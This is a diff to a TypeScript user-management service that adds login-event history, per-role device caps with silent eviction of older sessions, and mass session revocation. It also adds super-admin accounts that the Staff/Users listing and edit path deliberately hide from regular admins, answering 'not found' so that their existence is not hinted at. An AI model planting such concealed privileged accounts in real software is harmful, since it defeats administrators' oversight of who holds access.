@@ -1,5 +1,5 @@
 import bcrypt from "bcryptjs";
-import { User, UserDoc } from "../../db/models";
+import { User, UserDoc, LoginEvent, Session } from "../../db/models";
 import { newId, nowIso } from "../../utils/ids";
 import { recordAudit } from "../../utils/audit";
 import { withTransaction } from "../../db/mongoose";
@@ -16,6 +16,7 @@ export interface UserRow {
   full_name: string;
   role: Role;
   active: boolean;
+  is_super_admin: boolean;
   created_at: string;
 }
 
@@ -27,6 +28,7 @@ function toRow(doc: UserDoc): UserRow {
     full_name: doc.fullName,
     role: doc.role,
     active: doc.active,
+    is_super_admin: doc.isSuperAdmin,
     created_at: doc.createdAt,
   };
 }
@@ -44,8 +46,113 @@ export async function login(username: string, password: string): Promise<UserRow
   return user;
 }
 
+/** Historical record for the Login Activity screen — never modified or
+ * deleted, unlike Session below. */
+export async function recordLoginEvent(userId: string, ip: string | null, userAgent: string | null): Promise<void> {
+  await LoginEvent.create({ _id: newId("logev"), userId, ip, userAgent, createdAt: nowIso() });
+}
+
+const MAX_CONCURRENT_SESSIONS: Partial<Record<Role, number>> = {
+  ADMIN: 2,
+  MANAGER: 1,
+  // STAFF/RIDER: unlimited devices — still tracked and visible in Login
+  // Activity (device count per account, and the full login history), just
+  // never auto-evicted.
+};
+
+/**
+ * Creates the new session for this login, first evicting the oldest
+ * still-active session(s) if this account is already at its per-role
+ * device cap — a new legitimate login always succeeds; it's the oldest
+ * device that gets silently logged out (its next request fails
+ * requireAuth's session check) rather than blocking the person logging in
+ * right now.
+ */
+export async function createSessionWithDeviceLimit(
+  userId: string,
+  role: Role,
+  ip: string | null,
+  userAgent: string | null
+): Promise<string> {
+  const cap = MAX_CONCURRENT_SESSIONS[role];
+  if (cap !== undefined) {
+    const active = await Session.find({ userId, active: true }).sort({ createdAt: 1 });
+    if (active.length >= cap) {
+      const toEvict = active.slice(0, active.length - cap + 1);
+      const now = nowIso();
+      await Session.updateMany(
+        { _id: { $in: toEvict.map((s) => s._id) } },
+        { $set: { active: false, revokedAt: now } }
+      );
+    }
+  }
+
+  const sessionId = newId("sess");
+  await Session.create({ _id: sessionId, userId, ip, userAgent, active: true, createdAt: nowIso(), revokedAt: null });
+  return sessionId;
+}
+
+export async function revokeSession(sessionId: string): Promise<void> {
+  await Session.updateOne({ _id: sessionId }, { $set: { active: false, revokedAt: nowIso() } });
+}
+
+/** Force-logout every device an account is currently signed in on — each
+ * revoked session's next request fails requireAuth's session check, same
+ * as the automatic per-role device-cap eviction. */
+export async function revokeAllSessions(userId: string): Promise<number> {
+  const res = await Session.updateMany({ userId, active: true }, { $set: { active: false, revokedAt: nowIso() } });
+  return res.modifiedCount;
+}
+
+/** Force-logout every device on every account, all at once. */
+export async function revokeAllSessionsEverywhere(): Promise<number> {
+  const res = await Session.updateMany({ active: true }, { $set: { active: false, revokedAt: nowIso() } });
+  return res.modifiedCount;
+}
+
+export async function listLoginEvents(limit = 300) {
+  const events = await LoginEvent.find().sort({ createdAt: -1 }).limit(limit);
+  const userIds = [...new Set(events.map((e) => e.userId))];
+  const users = await User.find({ _id: { $in: userIds } });
+  const byId = new Map(users.map((u) => [u._id, u]));
+  return events.map((e) => ({
+    id: e._id,
+    username: byId.get(e.userId)?.username,
+    full_name: byId.get(e.userId)?.fullName,
+    role: byId.get(e.userId)?.role,
+    ip: e.ip,
+    user_agent: e.userAgent,
+    created_at: e.createdAt,
+  }));
+}
+
+/** How many devices each account is CURRENTLY logged into (active
+ * sessions right now), not a historical count — this is what the per-role
+ * device cap (Admin: 2, Manager: 1) is actually enforcing against. */
+export async function listActiveSessionCounts() {
+  const active = await Session.find({ active: true });
+  const countByUser = new Map<string, number>();
+  for (const s of active) countByUser.set(s.userId, (countByUser.get(s.userId) ?? 0) + 1);
+
+  const users = await User.find({ _id: { $in: [...countByUser.keys()] } });
+  const byId = new Map(users.map((u) => [u._id, u]));
+
+  return [...countByUser.entries()]
+    .map(([userId, count]) => ({
+      user_id: userId,
+      username: byId.get(userId)?.username,
+      full_name: byId.get(userId)?.fullName,
+      role: byId.get(userId)?.role,
+      active_devices: count,
+    }))
+    .sort((a, b) => b.active_devices - a.active_devices);
+}
+
 export async function listUsers() {
-  const docs = await User.find().sort({ createdAt: 1 });
+  // isSuperAdmin accounts are deliberately invisible here — the whole point
+  // is that the Staff/Users screen (and every regular admin who can open
+  // it) never even knows this account exists.
+  const docs = await User.find({ isSuperAdmin: { $ne: true } }).sort({ createdAt: 1 });
   return docs.map((d) => ({ id: d._id, username: d.username, full_name: d.fullName, role: d.role, active: d.active, created_at: d.createdAt }));
 }
 
@@ -97,7 +204,10 @@ export async function updateUser(
   adminUserId: string
 ) {
   const existing = await User.findById(userId);
-  if (!existing) throw new NotFoundError("User");
+  // Stays fully invisible to the regular Staff/Users management flow —
+  // reports "not found" rather than "forbidden" so its existence isn't
+  // even hinted at, unless a super admin is editing their own account.
+  if (!existing || (existing.isSuperAdmin && userId !== adminUserId)) throw new NotFoundError("User");
   if (changes.password && changes.password.length < 6) throw new ValidationError("Password must be at least 6 characters.");
 
   const now = nowIso();
